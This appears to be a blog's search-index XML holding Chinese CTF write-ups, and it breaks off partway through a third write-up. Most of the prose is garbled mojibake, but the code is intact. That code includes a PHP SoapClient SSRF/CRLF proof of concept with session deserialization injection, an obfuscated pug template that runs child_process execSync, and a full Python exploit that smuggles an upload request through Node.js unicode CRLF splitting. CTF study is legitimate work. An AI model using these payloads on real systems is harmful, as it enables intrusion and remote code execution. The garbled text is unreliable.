<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>buuï¼ˆåä¸€ï¼‰</title>
    <link href="/2021/08/21/up/"/>
    <url>/2021/08/21/up/</url>
    
    <content type="html"><![CDATA[<h1>bestphpâ€™s revenge</h1><h4 id="åˆ©ç”¨PHPåŸç”Ÿç±»æ¥æ„é€ POPé“¾"><a class="header-anchor" href="#åˆ©ç”¨PHPåŸç”Ÿç±»æ¥æ„é€ POPé“¾">ğŸ­</a>åˆ©ç”¨PHPåŸç”Ÿç±»æ¥æ„é€ POPé“¾</h4><p>åœ¨æ²¡æœ‰å¯ä»¥åˆ©ç”¨ç±»çš„æƒ…å†µä¸‹ï¼Œå°±æ‰¾ä¸åˆ°POPé“¾æ‰€ä»¥åªèƒ½è€ƒè™‘PHPåŸç”Ÿç±»ï¼Œä¹‹å‰è¿ç”¨çš„éƒ½æ˜¯phpçš„ä¸€äº›é­”æœ¯æ–¹æ³•ï¼Œä½†phpä¼šä½¿ç”¨äº†<code>zend_class_unserialize_deny</code>æ¥ç¦æ­¢ä¸€äº›ç±»çš„ååºåˆ—åŒ–ï¼Œæ­¤æ—¶å°±éœ€è¦åŸç”Ÿç±»ã€‚</p><p>SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚SOAPæ¶ˆæ¯åŸºæœ¬ä¸Šæ˜¯ä»å‘é€ç«¯åˆ°æ¥æ”¶ç«¯çš„å•å‘ä¼ è¾“ï¼Œä½†å®ƒä»¬å¸¸å¸¸ç»“åˆèµ·æ¥æ‰§è¡Œç±»ä¼¼äºè¯·æ±‚ / åº”ç­”çš„æ¨¡å¼ã€‚</p><p><strong>SoapClient</strong>æ˜¯ä¸€ä¸ªphpå†…ç½®çš„ç±»ï¼Œå½“__callæ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€HTTPå’ŒHTTPSè¯·æ±‚ã€‚è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span> ï¼ˆmixed $wsdl <span class="hljs-meta">[</span>ï¼Œ<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>ï¼‰</code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ã€‚</p><p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚<br>çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œå°±å¾ˆå®¹æ˜“æ„é€ å‡ºSSRFçš„åˆ©ç”¨payloadäº†ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°çš„locationé€‰é¡¹è®¾ç½®ä¸ºtarget_url</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>,                                 <span class="hljs-string">&#x27;uri&#x27;</span>=&gt; <span class="hljs-string">&quot;123&quot;</span>));<span class="hljs-keyword">echo</span> urlencode(serialize($a));<span class="hljs-meta">?&gt;</span></code></pre><p>åºåˆ—åŒ–åï¼Œè¿›è¡Œurlç¼–ç ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢åŒå¼•å·å¸¦æ¥çš„çƒ¦æ¼ã€‚</p><p>è¯¦è§ï¼š<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">ååºåˆ—åŒ–ä¹‹PHPåŸç”Ÿç±»çš„åˆ©ç”¨</a></p><h4 id="call-user-func"><a class="header-anchor" href="#call-user-func">ğŸ­</a>call_user_func()</h4><p>å½“ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯ä¸€ä¸ªç±»çš„åå­—ï¼Œæˆ–ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¼šæŠŠæ•°ç»„çš„ç¬¬äºŒä¸ªå€¼å½“åšæ–¹æ³•æ‰§è¡Œã€‚</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fun</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$a,$b</span>)</span>&#123;  \\å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œ        <span class="hljs-keyword">echo</span> <span class="hljs-number">11</span>;    &#125;&#125;$a = <span class="hljs-keyword">new</span> fun();call_user_func(<span class="hljs-keyword">array</span>($a,<span class="hljs-string">&quot;aaaas&quot;</span>));<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#outcomeï¼š11</span></code></pre><h4 id="CRLF-Injection"><a class="header-anchor" href="#CRLF-Injection">ğŸ­</a>CRLF Injection</h4><p>CRLFæ˜¯â€å›è½¦+æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTPHeaderä¸HTTPBodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTPå†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚ä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ï¼Œæ‰€ä»¥CRLFInjectionåˆå«HTTPResponseSplittingï¼Œç®€ç§°HRSã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶User-Agentçš„å€¼æ—¶ï¼Œå¤´éƒ¨å¯æ§ï¼Œå°±å¯ä»¥æ³¨å…¥crlfå®ç°ä¿®æ”¹httpè¯·æ±‚åŒ…ã€‚</p><h4 id="serialize-handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥"><a class="header-anchor" href="#serialize-handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥">ğŸ­</a>serialize_handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥</h4><p>serialize_handler=phpï¼šæŒ‡å®šphpåºåˆ—åŒ–å¼•æ“ï¼›<br>phpä¸­çš„sessionä¸­çš„å†…å®¹æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚<br>åœ¨php.iniä¸­å­˜åœ¨ä¸‰é¡¹é…ç½®é¡¹ï¼š</p><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</span><span class="hljs-keyword">session</span>.save_handler=&quot;&quot; <span class="hljs-comment">--è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)</span><span class="hljs-keyword">session</span>.serialize_handler   string <span class="hljs-comment">--å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤æ˜¯php(5.5.4åæ”¹ä¸ºphp_serialize)</span></code></pre><p>session.serialize_handlerå­˜åœ¨ä»¥ä¸‹å‡ ç§</p><table><thead><tr><th style="text-align:center">å¤„ç†å™¨</th><th style="text-align:center">å¯¹åº”çš„å­˜å‚¨æ ¼å¼</th></tr></thead><tbody><tr><td style="text-align:center">php</td><td style="text-align:center">é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°ååºåˆ—åŒ–å¤„ç†çš„å€¼</td></tr><tr><td style="text-align:center">php_binary</td><td style="text-align:center">é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°ååºåˆ—åŒ–å¤„ç†çš„å€¼</td></tr><tr><td style="text-align:center">php_serialize(php&gt;=5.5.4)</td><td style="text-align:center">ç»è¿‡serialize()å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„</td></tr></tbody></table><p>åœ¨PHPä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œæ·»åŠ </p><pre><code class="hljs less"><span class="hljs-selector-tag">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;éœ€è¦è®¾ç½®çš„å¼•æ“&#x27;</span>);</code></pre><p>å½“ä¼ å…¥<code>$_SESSION['name']='|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;'; </code>åºåˆ—åŒ–å¼•æ“ä½¿ç”¨çš„æ˜¯php_serializeï¼Œé‚£ä¹ˆå‚¨å­˜çš„sessionæ–‡ä»¶ä¸º<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code>è€Œååºåˆ—åŒ–å¼•æ“å¦‚æœä½¿ç”¨çš„æ˜¯phpï¼Œå°±ä¼šæŠŠ|ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ã€‚æŠŠa:1:{s:4:â€œnameâ€;s:5:&quot;å½“ä½œé”®åï¼Œè€ŒæŠŠO:5:â€œxxxxxâ€:1:{s:4:â€œtestâ€;s:3:â€œAAAâ€;}å½“ä½œç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œæœ€åä¼šæŠŠå®ƒè¿›è¡Œunserializeå¤„ç†ï¼Œæ­¤æ—¶å°±æ„æˆäº†ä¸€æ¬¡ååºåˆ—åŒ–æ³¨å…¥æ”»å‡»ã€‚</p><h4 id="è§£é¢˜"><a class="header-anchor" href="#è§£é¢˜">ğŸ­</a>è§£é¢˜</h4><p>é¢˜ç›®ç»™äº†æºç </p><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);$b = <span class="hljs-string">&#x27;implode&#x27;</span>;call_user_func($_GET[f],$_POST);session_start();<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[name]))&#123;    $_SESSION[name] = $_GET[name];&#125;var_dump($_SESSION);$a = <span class="hljs-keyword">array</span>(reset($_SESSION),<span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);call_user_func($b,$a);<span class="hljs-meta">?&gt;</span></code></pre><p>flag.php</p><pre><code class="hljs sqf"><span class="hljs-comment">//flag.php</span>session_start();<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;$<span class="hljs-built_in">flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<span class="hljs-keyword">if</span>($<span class="hljs-variable">_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;       $<span class="hljs-variable">_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = $<span class="hljs-built_in">flag</span>;   &#125;only localhost can get <span class="hljs-built_in">flag</span>!</code></pre><p>å¯ä»¥æ„é€ ssrfå»è®¿é—®flag.phpï¼Œç„¶åè·å–flagã€‚å†åˆ©ç”¨å˜é‡è¦†ç›–æŠŠSESSIONä¸­çš„flagæ‰“å°å‡ºæ¥ã€‚</p><p>POC</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));$payload = urlencode(serialize($attack));<span class="hljs-keyword">echo</span> $payload;</code></pre><p>å¤§ä½“å°±æ˜¯:sessionååºåˆ—åŒ–-&gt;soap(ssrf+crlf)-&gt;call_user_funcæ¿€æ´»soapç±»</p><h5 id="æ³¨å…¥pocå¾—åˆ°çš„session"><a class="header-anchor" href="#æ³¨å…¥pocå¾—åˆ°çš„session">ğŸ­</a>æ³¨å…¥pocå¾—åˆ°çš„session</h5><p><img src="/2021/08/21/up/2.png" alt="2"></p><p>åˆ©ç”¨<code>call_user_func($_GET[â€˜fâ€™], $_POST);</code>æ”¹å˜åºåˆ—åŒ–å¼•æ“ä¸ºphp_serializeï¼Œ<code>$_SESSION[â€˜nameâ€™] = $_GET[â€˜nameâ€™];</code>å°†åºåˆ—åŒ–å¯¹è±¡ä¼ å…¥sessionä¸­ï¼Œå¹¶åœ¨å‰é¢åŠ ä¸€ä¸ªâ€œ|â€,æ­¤æ—¶sessionä¼šä»¥php_serializeçš„è§„åˆ™å‚¨å­˜.</p><h5 id="è§¦å‘ååºåˆ—åŒ–ä½¿SoapClientå‘é€è¯·æ±‚"><a class="header-anchor" href="#è§¦å‘ååºåˆ—åŒ–ä½¿SoapClientå‘é€è¯·æ±‚">ğŸ­</a>è§¦å‘ååºåˆ—åŒ–ä½¿SoapClientå‘é€è¯·æ±‚</h5><p><img src="/2021/08/21/up/3.png" alt="3"></p><p><code>call_user_func($_GET[â€˜fâ€™], $_POST); </code>å°†bå˜é‡ç”¨extractå‡½æ•°è¦†ç›–ä¸ºcall_user_funcã€‚æ­¤æ—¶çš„åºåˆ—åŒ–å¼•æ“ä¸ºphpï¼Œæ­¤å‡½æ•°ä¼šæŒ‰ç…§phpçš„æ–¹æ³•æŠŠåˆšæ‰ä¼ å…¥çš„sessionï¼Œè¿›è¡Œååºåˆ—åŒ–å‚¨å­˜åœ¨sessionä¸­ã€‚</p><p><code>$a = array(reset($_SESSION), â€˜welcome_to_the_lctf2018â€™); </code>æŠŠsessionä¸â€œwelcome_to_the_lctf2018â€å’Œå¹¶ä¸ºä¸€ä¸ªæ•°ç»„ã€‚</p><p>æ­¤æ—¶<code>call_user_func($b, $a);</code> çš„$bå˜é‡å·²ç»è¢«è¦†ç›–æˆäº†call_user_funcï¼Œæ­¤æ—¶çš„ç¨‹åºå°±å˜æˆäº†<code>call_user_func(call_user_func,array($_session,â€˜welcome_to_the_lctf2018â€™));</code>ã€‚</p><p>$_sessionä¼šè°ƒç”¨<code>welcome_to_the_lctf2018</code>è¿™ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œ__callæ–¹æ³•è¢«è§¦å‘ï¼ŒæœåŠ¡å™¨æºå¸¦æˆ‘ä»¬è®¾ç½®çš„cookieï¼Œå»è®¿é—®flag.phpï¼Œç„¶åæŠŠflagï¼Œå‚¨å­˜åœ¨æ­¤cookieå¯¹åº”çš„sessionä¸­ã€‚</p><h5 id="æºå¸¦pocä¸­çš„cookieè®¿é—®å³å¯å¾—åˆ°flag"><a class="header-anchor" href="#æºå¸¦pocä¸­çš„cookieè®¿é—®å³å¯å¾—åˆ°flag">ğŸ­</a>æºå¸¦pocä¸­çš„cookieè®¿é—®å³å¯å¾—åˆ°flag</h5><p><img src="/2021/08/21/up/1.png" alt="1"></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/20175211lyz/p/11515519.html">https://www.cnblogs.com/20175211lyz/p/11515519.html</a></p><p><a href="https://www.anquanke.com/post/id/153065#h2-0">https://www.anquanke.com/post/id/153065#h2-0</a></p><h1>[GYCTF2020]Node Game</h1><p>é¢˜ç›®ç»™äº†æºç ï¼Œå®¡è®¡å‡ ä¸ªè·¯ç”±ï¼š</p><ul><li><p>/ æ¥å—actionå‚æ•°ã€‚å¦‚æœæ²¡æœ‰å°±é»˜è®¤ä¸ºindex file=dirname+/template/+action+.pug ç„¶åç”¨pugè¿›è¡Œæ¸²æŸ“ã€‚å¯ä»¥ç†è§£ä¸ºæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ .</p></li><li><p>/file_upload å®šä¹‰äº†åªèƒ½ç”±127.0.0.1è®¿é—®ã€‚å¹¶ä¸”æ˜¯remoteaddressä¸èƒ½ä¼ªé€ ï¼Œå¾—æ‰¾ä¸€ä¸ªSSRFçš„ç‚¹ æ–‡ä»¶ä¸Šä¼ ã€‚ filepath=/uploads/+mimetype+/ è€Œmimetypeå¯æ§ã€‚æˆ‘ä»¬å¯ä»¥è·¨ç›®å½• dir_file=dirname+filepath+filename é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ä»»æ„è·¯å¾„æ–‡ä»¶å†™å…¥.</p></li><li><p>/core æ¥å—ä¸€ä¸ªqå‚æ•°ã€‚ç„¶åå¯¹å…¶è¿›è¡Œé»‘åå•æ£€æµ‹ ç„¶åå¯¹qè¾“å…¥çš„å€¼è¿›è¡Œè¯·æ±‚ã€‚</p></li></ul><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨SSRFä¼ªé€ æœ¬åœ°ipè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ åŒ…å«å‘½ä»¤æ‰§è¡Œä»£ç çš„pugæ–‡ä»¶åˆ°/templateç›®å½•ä¸‹ï¼Œç„¶åç”¨<code>?action=</code>æ¥åŒ…å«è¯¥æ–‡ä»¶ã€‚å¦‚ä½•ç”¨SSRFæ¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå°±æ¶‰åŠNode jsçš„ç¼–ç å¤„ç†å®‰å…¨é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2894">å¤§ä½¬çš„æ–‡ç« </a></p><p>SSRFçš„æµç¨‹æ˜¯ï¼š</p><ul><li>Expressè·å–GET query (æ­¤æ—¶urldecodeä¸€æ¬¡)</li><li>å°†queryæ‹¼æ¥åˆ°<code>/source?</code>åé¢ï¼Œä¸¢ç»™http.getè¯·æ±‚ï¼Œæ­¤æ—¶ä¼šurlencodeä¸€æ¬¡</li><li>CRLFæ³¨å…¥ä¸€ä¸ªPOSTè¯·æ±‚è®¿é—®file_uploadæ¥å£ï¼ŒHTTPåè®®æŠ¥æ–‡çš„æ§åˆ¶å­—ç¬¦éœ€è¦æ˜¯non-encodeçš„</li></ul><p>å› ä¸ºpayloadæ˜¯åœ¨æœ€å¤–å±‚æŠ¥æ–‡çš„GET queryé‡Œï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨node.jsä¸­http.getè½¬ä¹‰unicodeçš„featureæ¥å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼ŒGETè¯·æ±‚é‡Œæ³¨å…¥<code>\u0120, \u010d, \u010a</code>ç­‰å­—ç¬¦ï¼ŒExpressæ‹¿åˆ°å°±æ˜¯å¯¹åº”unicodeï¼Œäº¤ç»™http.getåˆ™ä¼šè¢«è½¬æ¢ä¸ºå¯¹åº”asciiï¼Œè€Œä¸ä¼šè¢«urlencodeã€‚æ³¨ï¼šç¬¬ä¸€ä¸ªæŠ¥æ–‡éœ€è¦keep-aliveï¼Œé˜²æ­¢è¿æ¥æ–­å¼€</p><p>æ³¨å…¥ä¸€ä¸ªPOSTè¯·æ±‚æˆåŠŸåï¼Œéœ€è¦ä¸Šä¼ ä¸€ä¸ªpugæ¨¡ç‰ˆï¼Œæœä¸€ä¸‹pugæ¨¡æ¿å³å¯æ‰¾åˆ°æ ¼å¼ã€‚</p><pre><code class="hljs markdown">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child<span class="hljs-emphasis">_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[<span class="hljs-string">&#x27;ex&#x27;+&#x27;ecSync&#x27;</span>](<span class="hljs-link">&#x27;whoami&#x27;</span>).toString()&quot;)</span><span class="hljs-emphasis">-return x</span></code></pre><p>ä¸Šä¼ åéœ€è¦åŠ è½½æ¨¡æ¿ï¼Œå¯ä»¥çœ‹åˆ°<code>/?action=</code>å¯åŠ è½½ï¼Œä¸è¿‡é™åˆ¶äº†è·¯å¾„ç©¿è¶Šï¼Œè¿™é‡Œå°±å¾ˆåˆ»æ„äº†ã€‚åœ¨ä¸Šä¼ è·¯ç”±é‡Œä¿å­˜äº†ä¸¤æ¬¡ï¼Œä¸€ä¸ªé‡å‘½åäº†ä¿å­˜åœ¨<code>dist</code>ï¼Œå¦ä¸€ä¸ªå‰¯æœ¬ä¿å­˜åœ¨<code>uploads/MIME_TYPE/FILE_NAME</code>ï¼Œåœ¨MIMEé‡Œè·³ä¸€ä¸‹ç›®å½•åˆ°templateå°±è¡Œäº†</p><p>å¤§ä½¬çš„EXPï¼š</p><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requestspayload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;&quot;&quot;&quot;.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lethe.pug&quot;Content-Type: ../template-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(<span class="hljs-string">&#x27;child_&#x27;</span>+<span class="hljs-string">&#x27;pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>).toString()&quot;)-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--&quot;&quot;&quot;.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)payload = payload.format(len(body), body) \    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \    .replace(&quot;&#x27;&quot;, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>) \    + <span class="hljs-string">&#x27;GET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span>requests.<span class="hljs-keyword">get</span>(    <span class="hljs-string">&#x27;http://20bad283-63d2-49d3-b7aa-2f07db4d8241.node4.buuoj.cn:81/core?q=&#x27;</span> + payload)print(requests.<span class="hljs-keyword">get</span>(    <span class="hljs-string">&#x27;http://20bad283-63d2-49d3-b7aa-2f07db4d8241.node4.buuoj.cn:81/?action=lethe&#x27;</span>).text)</code></pre><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/2894</a></p>]]></content>
    
    
    <categories>
      
      <category>CRLFæ³¨å…¥</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆåï¼‰</title>
    <link href="/2021/08/20/hjs/"/>
    <url>/2021/08/20/hjs/</url>
    
    <content type="html"><![CDATA[<h1>[XNUCA2019Qualifier]HardJS</h1><h4 id="åç«¯RCEä¹‹opts-outputFunctionName"><a class="header-anchor" href="#åç«¯RCEä¹‹opts-outputFunctionName">ğŸ­</a>åç«¯RCEä¹‹opts.outputFunctionName</h4><p>é¢˜ç›®ç»™äº†æºç ï¼Œæ˜¯ä¸€ä¸ªnode.jsçš„åç«¯ï¼Œåº”è¯¥æ˜¯åŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œä»server.jså¼€å§‹å®¡è®¡ï¼š</p><p>æœ‰7ä¸ªè·¯ç”±ï¼Œå…¶ä¸­/getè·¯ç”±ä¸‹æœ‰ä¸€æ®µä»£ç </p><pre><code class="hljs n1ql">if(dataList[0].count == 0 )&#123;        res.json(&#123;&#125;)    &#125;else if(dataList[0].count &gt; 5) &#123; // if len &gt; 5 , <span class="hljs-keyword">merge</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">update</span> mysql                console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Merge the recorder in the database.&quot;</span>);         var sql = &quot;<span class="hljs-keyword">select</span> <span class="hljs-symbol">`id`</span>,<span class="hljs-symbol">`dom`</span> <span class="hljs-keyword">from</span>  <span class="hljs-symbol">`html`</span> <span class="hljs-keyword">where</span> userid=? <span class="hljs-string">&quot;;</span><span class="hljs-string">        var raws = await query(sql,[userid]);</span><span class="hljs-string">        var doms = &#123;&#125;</span><span class="hljs-string">        var ret = new Array(); </span><span class="hljs-string"></span><span class="hljs-string">        for(var i=0;i&lt;raws.length ;i++)&#123;</span><span class="hljs-string">            lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));</span><span class="hljs-string"></span><span class="hljs-string">            var sql = &quot;</span><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-symbol">`html`</span> <span class="hljs-keyword">where</span> id = ?<span class="hljs-string">&quot;;</span><span class="hljs-string">            var result = await query(sql,raws[i].id);</span><span class="hljs-string">        &#125;</span></code></pre><p>å½“ä»æ•°æ®åº“ä¸­æŸ¥æ‰¾å‡ºæ¥çš„æ•°æ®å¤§äº5æ¡æ—¶ï¼Œä¼šè°ƒç”¨lodashçš„defaultsDeepå‡½æ•°å°†å…¶åˆå¹¶ã€‚</p><p>é™¤äº†<code>/static</code>ï¼Œ<code>/login</code>ï¼Œ<code>/register</code>ä»¥å¤–ï¼Œæ¯ä¸ªè·¯ç”±åœ¨è®¿é—®æ—¶éƒ½ä¼šç»è¿‡<code>auth</code>å‡½æ•°è¿›è¡Œèº«ä»½éªŒè¯ï¼š</p><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> auth(req,res,next)&#123;    // var <span class="hljs-keyword">session</span> = req.<span class="hljs-keyword">session</span>;    <span class="hljs-keyword">if</span>(!req.<span class="hljs-keyword">session</span>.<span class="hljs-keyword">login</span> || !req.<span 